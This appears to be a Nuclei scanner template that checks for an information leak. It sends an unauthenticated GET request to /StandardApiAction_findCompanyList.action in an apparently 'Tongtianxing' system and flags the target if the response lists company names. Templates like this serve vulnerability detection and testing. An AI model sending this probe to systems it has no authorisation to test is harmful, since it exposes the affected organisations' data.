id: tongtianxing-standardapiAction-findcompanylist-infoleak
info:
  name: tongtianxing-standardapiAction-findcompanylist-infoleak
  author: tongtianxing-standardapiAction-findcompanylist-infoleak
  severity: low


requests:
  - raw:
      - |
        GET /StandardApiAction_findCompanyList.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: text/xml; charset=utf-8
        Accept-Encoding: gzip, deflate
        Connection: close



    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"companys","result","companyName")

